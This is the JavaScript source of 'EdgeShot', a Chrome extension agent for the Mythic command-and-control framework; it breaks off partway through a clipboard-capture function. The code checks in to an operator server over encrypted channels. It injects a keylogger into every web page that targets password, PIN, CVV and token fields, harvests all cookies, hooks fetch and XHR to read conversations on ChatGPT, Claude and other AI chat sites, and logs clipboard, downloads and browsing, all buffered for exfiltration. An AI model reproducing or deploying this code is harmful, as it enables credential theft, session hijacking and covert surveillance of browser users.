// ============================================================================
// EdgeShot — Mythic agent (MV3 service worker)
//
// Placeholders replaced at build time by builder.py:
//   {{UUID}}        = payload UUID
//   {{AESPSK}}      = AES-256 key (64 hex chars) from the http profile
//   {{GET_URL}}     = GET URL  (tasking retrieval)
//   {{POST_URL}}    = POST URL (checkin + responses)
//   {{QUERY_PARAM}} = GET query parameter name (default "q")
//
// Mythic protocol (mythic_encrypts = True):
//   message = base64( UUID_ascii(36) + IV(16) + ciphertext + HMAC-SHA256(32) )
//   AES-256-CBC (PKCS7) encryption; HMAC = SHA256( IV + ciphertext )
//   using the same AESPSK key. Actions: checkin / get_tasking / post_response.
// ============================================================================

const MYTHIC_UUID = "{{UUID}}";
const AES_PSK = "{{AESPSK}}";
const GET_URL = "{{GET_URL}}";
const POST_URL = "{{POST_URL}}";
const QUERY_PARAM = "{{QUERY_PARAM}}";
const RCE_ENABLED = {{ENABLE_RCE}}; // true only when built with enable_rce=true

let CALLBACK_UUID = MYTHIC_UUID; // updated after checkin

const POLL_MINUTES = 0.1; // ~6 seconds (same as EdgeShot)

// Commands currently implemented by this agent (reported by get_capabilities).
const CAPABILITIES = [
  "heartbeat", "get_status", "get_capabilities", "get_active_tab",
  "get_tabs", "kill", "exit", "alert", "open_tab", "get_screenshot",
  "get_dom", "get_history", "get_bookmarks", "upload_file",
  "execute_file", "get_buffer", "get_file", "start_keylogger",
  "stop_keylogger", "network_recon", "get_notification", "send_notification",
  "send_notification_v2", "set_notification", "enable_proxy",
  "disable_proxy", "proxy_set_rules",
  ...(RCE_ENABLED ? ["execute_cmd", "check_rce"] : []),
];

// ---------------------------------------------------------------------------
// base64 utilities
// ---------------------------------------------------------------------------
function bytesToBase64(bytes) {
  let binary = "";
  const chunk = 0x8000;
  for (let i = 0; i < bytes.length; i += chunk) {
    binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
  }
  return btoa(binary);
}

function base64ToBytes(b64) {
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

// Sniff a file's encoding and decode it as text. Windows profile files
// (ntuser.ini, NTUSER.DAT, .reg files) are often UTF-16, which Response.text()
// mangles as UTF-8. Returns { text, binary }:
//   - a UTF-16 BOM is definitive: decode and report text;
//   - otherwise NUL bytes in the head mean binary (or BOM-less UTF-16, which we
//     can't distinguish from binary, so the caller downloads it);
//   - otherwise decode UTF-8, falling back to Latin-1 (lossless) on failure.
function sniffAndDecode(bytes) {
  if (bytes.length >= 2 && bytes[0] === 0xFF && bytes[1] === 0xFE) {
    return { text: new TextDecoder("utf-16le").decode(bytes.subarray(2)), binary: false };
  }
  if (bytes.length >= 2 && bytes[0] === 0xFE && bytes[1] === 0xFF) {
    return { text: new TextDecoder("utf-16be").decode(bytes.subarray(2)), binary: false };
  }
  const start = (bytes.length >= 3 && bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) ? 3 : 0;
  const head = Math.min(bytes.length, 8192);
  for (let i = start; i < head; i++) {
    if (bytes[i] === 0) return { text: "", binary: true };
  }
  let text;
  try {
    text = new TextDecoder("utf-8", { fatal: true }).decode(bytes.subarray(start));
  } catch (_) {
    text = new TextDecoder("latin1").decode(bytes.subarray(start));
  }
  return { text, binary: false };
}

function base64ToBase64Url(b64) {
  return b64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  }
  return bytes;
}

// ---------------------------------------------------------------------------
// Key + crypto (WebCrypto — available in a service worker, secure context)
// ---------------------------------------------------------------------------
let KEY_BYTES = null;

function getKeyBytes() {
  if (KEY_BYTES) return KEY_BYTES;
  if (AES_PSK && AES_PSK.length === 64 && /^[0-9a-fA-F]+$/.test(AES_PSK)) {
    KEY_BYTES = hexToBytes(AES_PSK);
  } else {
    KEY_BYTES = base64ToBytes(AES_PSK); // base64 fallback
  }
  return KEY_BYTES;
}

async function importAesKey() {
  return crypto.subtle.importKey(
    "raw", getKeyBytes(), { name: "AES-CBC" }, false, ["encrypt", "decrypt"]
  );
}

async function importHmacKey() {
  return crypto.subtle.importKey(
    "raw", getKeyBytes(), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
  );
}

async function encryptMessage(uuidStr, obj) {
  const plaintext = new TextEncoder().encode(JSON.stringify(obj));
  const iv = crypto.getRandomValues(new Uint8Array(16));
  const aesKey = await importAesKey();
  const ciphertext = new Uint8Array(
    await crypto.subtle.encrypt({ name: "AES-CBC", iv }, aesKey, plaintext)
  );

  const hmacKey = await importHmacKey();
  const macInput = new Uint8Array(iv.length + ciphertext.length);
  macInput.set(iv, 0);
  macInput.set(ciphertext, iv.length);
  const hmac = new Uint8Array(await crypto.subtle.sign("HMAC", hmacKey, macInput));

  const uuidBytes = new TextEncoder().encode(uuidStr);
  const total = new Uint8Array(uuidBytes.length + iv.length + ciphertext.length + hmac.length);
  let off = 0;
  total.set(uuidBytes, off); off += uuidBytes.length;
  total.set(iv, off); off += iv.length;
  total.set(ciphertext, off); off += ciphertext.length;
  total.set(hmac, off);
  return bytesToBase64(total);
}

async function decryptMessage(b64) {
  const bytes = base64ToBytes(b64);
  const uuidStr = new TextDecoder().decode(bytes.slice(0, 36));
  const iv = bytes.slice(36, 52);
  const ciphertext = bytes.slice(52, bytes.length - 32);
  const hmac = bytes.slice(bytes.length - 32);

  // (HMAC verification optional — CBC decryption is enough to detect tampering)
  const aesKey = await importAesKey();
  const plaintext = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, aesKey, ciphertext);
  return { uuid: uuidStr, msg: JSON.parse(new TextDecoder().decode(plaintext)) };
}

// ---------------------------------------------------------------------------
// Send / receive
// ---------------------------------------------------------------------------
async function postMessage(obj) {
  const enc = await encryptMessage(CALLBACK_UUID, obj);
  const resp = await fetch(POST_URL, { method: "POST", body: enc });
  const respText = await resp.text();
  if (!respText) return null;
  try {
    return (await decryptMessage(respText)).msg;
  } catch (e) {
    console.error("decrypt post response failed", e);
    return null;
  }
}

async function getTasking() {
  const enc = await encryptMessage(CALLBACK_UUID, {
    action: "get_tasking",
    tasking_size: -1,
  });
  const url = GET_URL + "?" + QUERY_PARAM + "=" + base64ToBase64Url(enc);
  const resp = await fetch(url, { method: "GET" });
  const respText = await resp.text();
  if (!respText) return { action: "get_tasking", tasks: [] };
  try {
    return (await decryptMessage(respText)).msg;
  } catch (e) {
    console.error("decrypt get_tasking failed", e);
    return { action: "get_tasking", tasks: [] };
  }
}

// ---------------------------------------------------------------------------
// Checkin
// ---------------------------------------------------------------------------
async function checkin() {
  const msg = {
    action: "checkin",
    uuid: MYTHIC_UUID,
    user: "extension",
    host: "browser-agent",
    pid: 0,
    ips: [],
    os: "Chrome",
    process_name: "chrome",
    architecture: "x64",
    integrity_level: 2,
    external_ip: "",
    domain: "",
  };
  const enc = await encryptMessage(MYTHIC_UUID, msg);
  const resp = await fetch(POST_URL, { method: "POST", body: enc });
  const respText = await resp.text();
  console.log("checkin HTTP status:", resp.status, "len:", respText.length);
  if (!resp.ok) {
    console.error("checkin HTTP error:", resp.status, respText.slice(0, 200));
    return;
  }
  if (respText) {
    try {
      const dec = await decryptMessage(respText);
      const m = dec.msg;
      console.log("checkin response:", JSON.stringify(m));
      // IMPORTANT: Mythic returns the new callback UUID under the "id" key
      // (never "uuid" — see handleAgentMessageCheckin.go + reflectBackOtherKeys).
      if (m && (m.id || m.uuid)) CALLBACK_UUID = m.id || m.uuid;
    } catch (e) {
      console.error("checkin decrypt failed", e);
    }
  }
}

// ---------------------------------------------------------------------------
// Task execution
// ---------------------------------------------------------------------------
function isScriptable(url) {
  if (!url) return false;
  if (url.startsWith("chrome://")) return false;
  if (url.startsWith("devtools://")) return false;
  if (url.includes("chrome.google.com/webstore")) return false;
  if (url.startsWith("edge://")) return false;
  if (url.startsWith("about:")) return false;
  return true;
}

// Parse the task arguments. Mythic sends them as a JSON string in task.parameters
// (e.g. '{"message":"hi"}'), built from the CommandParameter values server-side.
function getParams(task) {
  try {
    return JSON.parse(task.parameters || "{}");
  } catch {
    return {};
  }
}

// Build the native "download" field of a post_response. This is how Mythic
// expects agent -> server file transfers (single chunk, base64). When
// isScreenshot is true the file is rendered in the screenshot viewer.
function makeDownload(filename, base64Data, isScreenshot, fullPath) {
  return {
    total_chunks: 1,
    chunk_num: 1,
    chunk_data: base64Data,
    filename: filename,
    is_screenshot: !!isScreenshot,
    full_path: fullPath || "",
  };
}

// Save raw bytes to the victim's Downloads folder. In an MV3 service worker
// URL.createObjectURL is unavailable, so we go through a data: URL. This is
// fine for files up to ~a couple MB; for larger payloads we'd need an
// offscreen document to mint a blob: URL (TODO, milestone 3).
function saveDataToDownloads(filename, base64Data) {
  return chrome.downloads.download({
    url: "data:application/octet-stream;base64," + base64Data,
    filename: filename,
    conflictAction: "overwrite",
    saveAs: false,
  });
}

// Pull a Mythic-side file (identified by its file_id / agent_file_id) into the
// victim's Downloads folder. Mythic transfers files to the agent via a pull
// model: the agent requests each chunk through a post_response carrying an
// "upload" field, and the server answers with base64 chunk_data.
async function pullFileFromMythic(task, fileId, filename) {
  const chunkSize = 512000;
  const chunks = [];
  let chunkNum = 1;
  let totalChunks = -1;
  while (totalChunks < 0 || chunkNum <= totalChunks) {
    const reply = await postMessage({
      action: "post_response",
      responses: [{
        task_id: task.id,
        upload: {
          file_id: fileId,
          chunk_num: chunkNum,
          chunk_size: chunkSize,
          full_path: filename,
        },
      }],
    });
    const r = (reply && reply.responses && reply.responses[0]) || {};
    if (r.status === "error") throw new Error(r.error || "upload error");
    if (!r.chunk_data) break;
    chunks.push(base64ToBytes(r.chunk_data));
    if (r.total_chunks) totalChunks = r.total_chunks;
    if (totalChunks > 0 && chunkNum >= totalChunks) break;
    chunkNum += 1;
    if (chunkNum > 10000) throw new Error("too many chunks");
  }
  if (chunks.length === 0) throw new Error("no chunks received");
  const totalLen = chunks.reduce((a, c) => a + c.length, 0);
  const full = new Uint8Array(totalLen);
  let off = 0;
  for (const c of chunks) { full.set(c, off); off += c.length; }
  const downloadId = await saveDataToDownloads(filename, bytesToBase64(full));
  return { downloadId, bytes: totalLen };
}

// ============================================================================
// Passive data buffer (flushed by get_buffer)
//
// The listeners below capture keylogs, clipboard, cookies, LLM chats, browsing
// activity and download events while the operator is away. Mythic attaches
// every exfil item to a real task_id (there is no fire-and-forget channel), so
// instead of pushing each event immediately we buffer everything in
// chrome.storage.local and drain it all when the operator runs get_buffer.
// ============================================================================
const BUFFER_TYPES = ["keylog", "clipboard", "cookies", "llm", "activity", "downloads"];
const BUFFER_MAX = 500; // max entries per type, keeps storage bounded

async function bufferPush(type, entry) {
  try {
    const key = "buffer_" + type;
    const cur = (await chrome.storage.local.get(key))[key] || [];
    cur.push(entry);
    if (cur.length > BUFFER_MAX) cur.splice(0, cur.length - BUFFER_MAX);
    await chrome.storage.local.set({ [key]: cur });
  } catch (_) {}
}

async function bufferDrain(type) {
  try {
    const key = "buffer_" + type;
    const cur = (await chrome.storage.local.get(key))[key] || [];
    await chrome.storage.local.remove(key);
    return cur;
  } catch (_) {
    return [];
  }
}

async function bufferDrainAll() {
  const out = {};
  for (const t of BUFFER_TYPES) out[t] = await bufferDrain(t);
  return out;
}

// ============================================================================
// LLM READER (MAIN-world network interception)
//
// Injected into known LLM tabs in the page's MAIN world: patches fetch / XHR,
// parses the LLM API responses per-platform, and posts the structured
// conversation back to the isolated content script (which buffers it).
// ============================================================================
const LLM_HOSTS = [
  "chatgpt.com", "chat.openai.com", "claude.ai", "gemini.google.com",
  "copilot.microsoft.com", "chat.deepseek.com", "perplexity.ai",
  "chat.mistral.ai", "huggingface.co", "phind.com", "grok.com", "x.ai", "use.ai",
];

function isLLMTab(url) {
  try {
    const h = new URL(url).hostname.replace(/^www\./, "");
    return LLM_HOSTS.some((d) => h === d || h.endsWith("." + d) || h.includes(d));
  } catch {
    return false;
  }
}

function injectLLMHook(tabId) {
  chrome.scripting
    .executeScript({ target: { tabId }, world: "MAIN", func: llmHook })
    .catch(() => {});
}

function llmHook() {
  if (window.__edgeshot_llm_hooked) return;
  window.__edgeshot_llm_hooked = true;

  const DEBUG = false;
  const log = (...a) => { if (DEBUG) console.log("[LLMReader]", ...a); };
  const host = location.hostname.replace(/^www\./, "");

  let lastSent = "";
  let pendingTimer = null;
  function emit(platform, title, messages) {
    const conv = (messages || []).filter((m) => m && m.text && m.text.trim());
    if (!conv.length) return;
    const payload = {
      platform,
      meta: { title: title || document.title || platform, user: getUser(), timestamp: new Date().toISOString() },
      conversation: conv.map((m) => ({ role: m.role === "assistant" ? "assistant" : "user", text: m.text.trim() })),
      conv_key: location.host + location.pathname,
    };
    const key = JSON.stringify(payload.conversation);
    if (key === lastSent) return;
    // Debounce: emit() fires constantly while a reply streams in. Only send
    // once the conversation has been stable for ~1.2s (latest = most complete).
    clearTimeout(pendingTimer);
    pendingTimer = setTimeout(() => {
      lastSent = key;
      log("emit", platform, conv.length, "messages");
      window.postMessage({ __edgeshot_llm: true, payload }, "*");
    }, 1200);
  }

  function getUser() {
    const metas = ["meta[name='user-email']", "meta[name='author']"];
    for (const s of metas) {
      const el = document.querySelector(s);
      if (el && el.content) return el.content;
    }
    return "unknown";
  }

  const j = (t) => { try { return JSON.parse(t); } catch { return null; } };
  const sseData = (full) => full.split("\n").map((l) => l.trim()).filter((l) => l.startsWith("data:")).map((l) => l.slice(5).trim()).filter((d) => d && d !== "[DONE]");

  // ---- Per-platform adapters ----
  const ADAPTERS = {
    "chatgpt.com": chatgptAdapter, "chat.openai.com": chatgptAdapter,
    "claude.ai": claudeAdapter,
    "chat.deepseek.com": deepseekAdapter,
    "gemini.google.com": geminiAdapter,
    "copilot.microsoft.com": genericDomAdapter,
    "perplexity.ai": genericDomAdapter,
    "chat.mistral.ai": genericDomAdapter,
    "huggingface.co": genericDomAdapter,
    "phind.com": genericDomAdapter,
    "grok.com": genericDomAdapter, "x.ai": genericDomAdapter,
    "use.ai": genericDomAdapter,
  };

  function chatgptAdapter() {
    return {
      name: "ChatGPT",
      apis: [
        { test: (u) => /\/backend-api\/conversation\/[0-9a-f-]{10,}/.test(u), parse: parseChatgptFull },
        { test: (u) => /\/backend-api\/conversation$/.test(u), stream: true, parse: parseChatgptStream },
      ],
    };
  }
  function parseChatgptFull(txt) {
    const d = j(txt); if (!d || !d.mapping) return null;
    const nodes = Object.values(d.mapping).filter((n) => n && n.message);
    nodes.sort((a, b) => (a.message.create_time || 0) - (b.message.create_time || 0));
    const msgs = [];
    for (const n of nodes) {
      const m = n.message, role = m.author && m.author.role;
      if (role !== "user" && role !== "assistant") continue;
      const parts = (m.content && m.content.parts) || [];
      const text = parts.filter((p) => typeof p === "string").join("\n");
      if (text.trim()) msgs.push({ role, text });
    }
    return { title: d.title, messages: msgs };
  }
  function parseChatgptStream(full) {
    let last = null;
    for (const d of sseData(full)) { const o = j(d); if (o && o.message) last = o.message; }
    if (!last) return null;
    const text = ((last.content && last.content.parts) || []).filter((p) => typeof p === "string").join("\n");
    const role = last.author && last.author.role;
    if (!text.trim() || (role !== "user" && role !== "assistant")) return null;
    return { messages: [{ role, text }] };
  }

  function claudeAdapter() {
    return {
      name: "Claude",
      apis: [
        { test: (u) => /\/chat_conversations\/[0-9a-f-]{10,}/.test(u) && !/completion/.test(u), parse: parseClaudeFull },
        { test: (u) => /\/completion$/.test(u), stream: true, parse: parseClaudeStream },
      ],
    };
  }
  function parseClaudeFull(txt) {
    const d = j(txt); if (!d) return null;
    const arr = d.chat_messages || d.messages; if (!Array.isArray(arr)) return null;
    const msgs = [];
    for (const m of arr) {
      const role = (m.sender || m.role) === "assistant" ? "assistant" : "user";
      let text = m.text || "";
      if (!text && Array.isArray(m.content)) text = m.content.filter((c) => c && c.type === "text").map((c) => c.text).join("\n");
      if (text.trim()) msgs.push({ role, text });
    }
    return { title: d.name, messages: msgs };
  }
  function parseClaudeStream(full) {
    let text = "";
    for (const d of sseData(full)) { const o = j(d); if (o && typeof o.completion === "string") text += o.completion; }
    return text.trim() ? { messages: [{ role: "assistant", text }] } : null;
  }

  function deepseekAdapter() {
    return {
      name: "DeepSeek",
      apis: [
        { test: (u) => /history_messages|fetch_conversation/.test(u), parse: parseDeepseekFull },
      ],
      dom: geminiDomScrape,
    };
  }
  function parseDeepseekFull(txt) {
    const d = j(txt); if (!d) return null;
    const arr = (d.data && (d.data.chat_messages || d.data.messages)) || d.chat_messages || d.messages;
    if (!Array.isArray(arr)) return null;
    const msgs = [];
    for (const m of arr) {
      const role = (m.role || m.sender) === "assistant" ? "assistant" : "user";
      const text = m.content || m.text || "";
      if (typeof text === "string" && text.trim()) msgs.push({ role, text });
    }
    return { messages: msgs };
  }

  // Gemini uses obfuscated batchexecute -> DOM scraping is more reliable.
  function geminiAdapter() { return { name: "Gemini", apis: [], dom: geminiDomScrape }; }
  function genericDomAdapter() { return { name: platformName(), apis: [], dom: geminiDomScrape }; }

  function platformName() {
    if (host.includes("copilot")) return "Copilot";
    if (host.includes("perplexity")) return "Perplexity";
    if (host.includes("mistral")) return "Mistral";
    if (host.includes("huggingface")) return "HuggingChat";
    if (host.includes("phind")) return "Phind";
    if (host.includes("grok") || host.includes("x.ai")) return "Grok";
    if (host.includes("use.ai")) return "Use.ai";
    return host;
  }

  // Generic DOM fallback: collect user/assistant turns using broad, stable-ish
  // structural cues (role attributes / common containers). Best-effort.
  function geminiDomScrape() {
    const sels = [
      "[data-message-author-role]", "user-query, model-response",
      "[data-testid='user-message'], [data-is-streaming]",
      "[data-message-role]", "article [data-testid]",
    ];
    for (const sel of sels) {
      const els = Array.from(document.querySelectorAll(sel));
      if (els.length < 1) continue;
      const msgs = els.map((el) => {
        let role = "assistant";
        const r = el.getAttribute("data-message-author-role") || el.getAttribute("data-message-role");
        if (r) role = r;
        else if (el.getAttribute("data-testid") === "user-message" || el.tagName.toLowerCase() === "user-query") role = "user";
        return { role, text: (el.innerText || "").trim() };
      }).filter((m) => m.text);
      if (msgs.length) return { messages: msgs };
    }
    return null;
  }

  const adapterFactory = ADAPTERS[host] || (LLM_HOST_FALLBACK());
  function LLM_HOST_FALLBACK() { for (const k in ADAPTERS) if (host.includes(k)) return ADAPTERS[k]; return genericDomAdapter; }
  const adapter = (typeof adapterFactory === "function" ? adapterFactory : genericDomAdapter)();
  log("adapter:", adapter.name, "host:", host);

  function handleResponse(url, text) {
    try {
      for (const api of adapter.apis || []) {
        if (!api.test(url)) continue;
        const res = api.parse(text);
        if (res && res.messages && res.messages.length) emit(adapter.name, res.title, res.messages);
        return;
      }
    } catch (e) { log("parse error", e); }
  }

  // ---- fetch hook ----
  const origFetch = window.fetch;
  window.fetch = function (...args) {
    const url = (args[0] && args[0].url) || String(args[0] || "");
    return origFetch.apply(this, args).then((resp) => {
      try {
        if ((adapter.apis || []).some((a) => a.test(url))) {
          resp.clone().text().then((t) => handleResponse(url, t)).catch(() => {});
        }
      } catch {}
      return resp;
    });
  };

  // ---- XHR hook ----
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) { this.__ee_url = url; return origOpen.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function () {
    this.addEventListener("load", () => {
      try {
        const url = this.__ee_url || "";
        if ((adapter.apis || []).some((a) => a.test(url))) handleResponse(url, this.responseText);
      } catch {}
    });
    return origSend.apply(this, arguments);
  };

  // ---- DOM fallback (for adapters without a working API path) ----
  if (adapter.dom) {
    let t = null;
    const run = () => { try { const r = adapter.dom(); if (r && r.messages) emit(adapter.name, document.title, r.messages); } catch {} };
    const obs = new MutationObserver(() => { clearTimeout(t); t = setTimeout(run, 800); });
    obs.observe(document.documentElement, { childList: true, subtree: true });
    setTimeout(run, 1500);
  }
}

// ============================================================================
// Inline content script (ISOLATED world) — injected into every http(s) tab.
// Auto-keylogger + LLM bridge. content.js stays empty for GAP compatibility.
// ============================================================================
function keyloggerContentScript() {
  // Guard against double injection
  if (window.__edgeshot_injected) return;
  window.__edgeshot_injected = true;

  // LLM bridge: forward conversations captured by the MAIN-world hook
  // (window.postMessage) to the background service worker.
  window.addEventListener("message", (e) => {
    if (e.source === window && e.data && e.data.__edgeshot_llm) {
      chrome.runtime.sendMessage({ action: "exfiltrate", data: e.data.payload }).catch(() => {});
    }
  });

  // ==============================
  // == AUTO KEYLOGGER (DOM)     ==
  // ==============================
  const attachedInputs = new WeakSet();

  const SENSITIVE_PATTERNS = [
    /password/i, /passwd/i, /pass/i, /pwd/i,
    /mot.de.passe/i, /identifiant/i,
    /username/i, /login/i, /accountname/i,
    /email/i, /e-mail/i, /mail/i,
    /secret/i, /pin/i, /cvv/i, /code/i, /token/i,
    /login-username/i,
  ];

  const BUFFER_SIZE = 30;
  const FLUSH_TIMEOUT = 30000;
  const buffer = [];

  let isRecording = false;
  let url = null;
  let cmdId = null;
  let flushTimer = null;

  function isSensitiveField(el) {
    // Always capture password fields
    if (el.type === "password") return true;
    // Always capture fields with autocomplete hints
    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
    if (ac.includes("password") || ac.includes("username") || ac.includes("email")) return true;

    // Collect all attribute values and related text for pattern matching.
    const attrs = new Set();
    const add = (v) => { if (v && typeof v === "string" && v.length > 0) attrs.add(v); };

    for (const attr of ["type", "name", "id", "placeholder", "class",
        "aria-label", "autocomplete", "can-field", "data-field"]) {
      add(el.getAttribute(attr));
    }

    // Normalise the id/name so patterns like /accountname/ match across "_"/"-".
    const rawID = (el.id || el.name || "");
    add(rawID);
    add(rawID.replace(/[_-]/g, ""));

    // aria-labelledby — resolve the referenced element's text
    const labelledBy = el.getAttribute("aria-labelledby");
    if (labelledBy) {
      const ref = document.getElementById(labelledBy);
      if (ref) add(ref.textContent);
    }

    // Associated <label for="...">
    if (el.id) {
      try {
        const safeID = el.id.replace(/["\\]/g, "\\$&");
        const label = document.querySelector(`label[for="${safeID}"]`);
        if (label) add(label.textContent);
      } catch (_) { /* ignore */ }
    }

    // Parent <label> wrapper
    const parentLabel = el.closest("label");
    if (parentLabel) add(parentLabel.textContent);

    return Array.from(attrs).some((v) => SENSITIVE_PATTERNS.some((rx) => rx.test(v)));
  }

  function attachAutoKeylogger(input) {
    if (attachedInputs.has(input)) return;
    attachedInputs.add(input);

    input.addEventListener("focus", () => {
      isRecording = true;
      url = window.location.href;
      cmdId = "auto_" + Date.now();
      buffer.length = 0;
    });

    input.addEventListener("blur", () => {
      if (!isRecording) return;
      flushBuffer();
      isRecording = false;
    });

    // Paste capture (KeePass, clipboard managers, right-click paste).
    input.addEventListener("paste", (e) => {
      if (!isRecording) return;
      const pasted = (e.clipboardData || window.clipboardData || {}).getData
        ? (e.clipboardData.getData("text/plain") || e.clipboardData.getData("text"))
        : "";
      if (!pasted) return;
      if (buffer.length > 0) buffer.push(" ");
      buffer.push("[PASTE:" + pasted + "]");
      resetTimer();
      // Auto-flush on long pastes (likely a password)
      if (pasted.length > 5) {
        flushBuffer();
        isRecording = false;
      }
    });

    // Hook form submission
    const form = input.closest("form");
    if (form) {
      form.addEventListener("submit", () => {
        if (isRecording) {
          flushBuffer();
          isRecording = false;
        }
      });
    }
  }

  function scanDOM() {
    const fields = document.querySelectorAll(
      'input, textarea, [contenteditable="true"], [role="textbox"]'
    );
    fields.forEach((el) => {
      if (isSensitiveField(el)) {
        attachAutoKeylogger(el);
        // If the field is already focused at scan time
        if (document.activeElement === el && !isRecording) {
          isRecording = true;
          url = window.location.href;
          cmdId = "auto_" + Date.now();
          buffer.length = 0;
        }
      }
    });

    // Scan shadow DOM recursively (Web Components)
    document.querySelectorAll("*").forEach((el) => {
      if (el.shadowRoot) scanShadowRoot(el.shadowRoot);
    });
  }

  function scanShadowRoot(root) {
    const fields = root.querySelectorAll(
      'input, textarea, [contenteditable="true"], [role="textbox"]'
    );
    fields.forEach((el) => {
      if (isSensitiveField(el)) attachAutoKeylogger(el);
    });
    root.querySelectorAll("*").forEach((el) => {
      if (el.shadowRoot) scanShadowRoot(el.shadowRoot);
    });
  }

  function startAutoKeylogger() {
    scanDOM();
    const observer = new MutationObserver(() => scanDOM());
    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ["type", "name", "id", "class", "autocomplete", "aria-label", "placeholder"],
    });
    // Periodic re-scan: SPAs / React re-render without detectable mutations.
    setInterval(scanDOM, 3000);
  }

  if (document.body) {
    startAutoKeylogger();
  } else {
    document.addEventListener("DOMContentLoaded", startAutoKeylogger);
  }

  function flushBuffer() {
    if (buffer.length === 0) return;
    safeSendMessage({ type: "BUFFER_FLUSH", keys: buffer.join(""), id: cmdId, url: url });
    buffer.length = 0;
    clearTimeout(flushTimer);
    flushTimer = null;
  }

  function resetTimer() {
    clearTimeout(flushTimer);
    flushTimer = setTimeout(() => flushBuffer(), FLUSH_TIMEOUT);
  }

  function handleKeyDown(event) {
    // Auto-start: if the user types on a sensitive field we missed, start now
    // (catches React re-renders, dynamic forms).
    if (!isRecording) {
      const target = event.target;
      if (target && /^(INPUT|TEXTAREA)$/.test(target.tagName) && isSensitiveField(target)) {
        isRecording = true;
        url = window.location.href;
        cmdId = "auto_" + Date.now();
        buffer.length = 0;
        attachAutoKeylogger(target);
      } else {
        return;
      }
    }
    buffer.push(event.key);
    resetTimer();

    if (event.key === "Enter") {
      flushBuffer();
      isRecording = false;
    }

    if (buffer.length >= BUFFER_SIZE) {
      flushBuffer();
    }
  }

  function safeSendMessage(msg) {
    if (!chrome.runtime?.id) return;
    try {
      chrome.runtime.sendMessage(msg).catch(() => {});
    } catch (e) { /* ignore */ }
  }

  // Always active, but only records when isRecording === true.
  document.addEventListener("keydown", handleKeyDown);

  // Global focusin — catches focus on any sensitive field, even dynamically
  // created ones our scan missed.
  document.addEventListener("focusin", (e) => {
    const target = e.target;
    if (!target || !/^(INPUT|TEXTAREA)$/.test(target.tagName) &&
        !target.isContentEditable && target.getAttribute("role") !== "textbox") return;
    if (!isSensitiveField(target)) return;
    attachAutoKeylogger(target);
    isRecording = true;
    url = window.location.href;
    cmdId = "auto_" + Date.now();
    buffer.length = 0;
  }, true);

  // Global paste — catches pastes on fields not explicitly attached yet.
  document.addEventListener("paste", (e) => {
    const target = e.target;
    if (!target || !/^(INPUT|TEXTAREA)$/.test(target.tagName) &&
        !target.isContentEditable && target.getAttribute("role") !== "textbox") return;
    if (!isSensitiveField(target)) return;
    if (!isRecording) {
      isRecording = true;
      url = window.location.href;
      cmdId = "auto_" + Date.now();
      buffer.length = 0;
    }
    const pasted = (e.clipboardData || window.clipboardData || {}).getData
      ? ((e.clipboardData.getData("text/plain") || e.clipboardData.getData("text") || ""))
      : "";
    if (!pasted) return;
    if (buffer.length > 0) buffer.push(" ");
    buffer.push("[PASTE:" + pasted + "]");
    resetTimer();
    if (pasted.length > 5) { flushBuffer(); isRecording = false; }
  }, true);

  // Background-originated orders (start_keylogger / stop_keylogger commands).
  chrome.runtime.onMessage.addListener((message) => {
    if (message.type === "START_RECORDING") {
      url = message.url;
      cmdId = message.id;
      isRecording = true;
      buffer.length = 0;
    }
    if (message.type === "STOP_RECORDING") {
      isRecording = false;
      safeSendMessage({ type: "RECORDING_DONE", keys: buffer.join(""), id: cmdId, url: url });
    }
  });
}

// ============================================================================
// Passive listener registrations (always on)
// ============================================================================

// ---- Activity + cookies (tab visit) + auto-injection ----
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete") return;
  if (!tab.url || !isScriptable(tab.url)) return;

  let domain;
  try { domain = new URL(tab.url).hostname; } catch (_) { return; }
  if (!domain) return;

  bufferPush("activity", {
    domain, url: tab.url, title: tab.title || "",
    timestamp: new Date().toISOString(),
  });

  chrome.cookies.getAll({ domain }).then((cookies) => {
    if (cookies.length > 0) {
      bufferPush("cookies", {
        url: tab.url, domain, cookies,
        timestamp: new Date().toISOString(),
      });
    }
  }).catch(() => {});

  // Auto-inject the keylogger content script into http(s) pages.
  if (tab.url.startsWith("http://") || tab.url.startsWith("https://")) {
    chrome.scripting.executeScript({ target: { tabId }, func: keyloggerContentScript }).catch(() => {});
  }
  // LLM reader (MAIN-world hook) on known LLM hosts.
  if (isLLMTab(tab.url)) injectLLMHook(tabId);
});

// ---- Real-time cookie tracking ----
chrome.cookies.onChanged.addListener((changeInfo) => {
  const { cookie, cause } = changeInfo;
  // cause: "evicted" | "expired" | "explicit" | "overwrite"
  const isDeleted = !cookie.value || cause === "evicted" || cause === "expired";
  bufferPush("cookies", {
    name: cookie.name,
    value: cookie.value || null,
    domain: cookie.domain || "unknown",
    path: cookie.path || "/",
    secure: cookie.secure || false,
    httpOnly: cookie.httpOnly || false,
    sameSite: cookie.sameSite || "Lax",
    expirationDate: cookie.expirationDate || null,
    cause: cause,
    deleted: isDeleted,
    timestamp: new Date().toISOString(),
  });
});

// ---- Download tracking ----
chrome.downloads.onCreated.addListener((item) => {
  bufferPush("downloads", { event: "created", ...item, timestamp: new Date().toISOString() });
});
chrome.downloads.onChanged.addListener((delta) => {
  bufferPush("downloads", { event: "changed", ...delta, timestamp: new Date().toISOString() });
});

// ---- Clipboard (on tab switch / window focus) ----
let lastClipboard = "";
async function captureClipboard(tabId) {
  try {
    const tab = await chrome.tabs.get(tabId);
    if (!tab.url || !isScriptable(tab.url)) return;
    const result = await chrome.scripting.executeScript({
      target: { tabId },
      func: async () => {
        try { return await navigator.clipboard.readText(); } catch { return null; }
      },
    });
    const text = result?.[0]?.result;
    if (!text || text === lastClipboard) return;
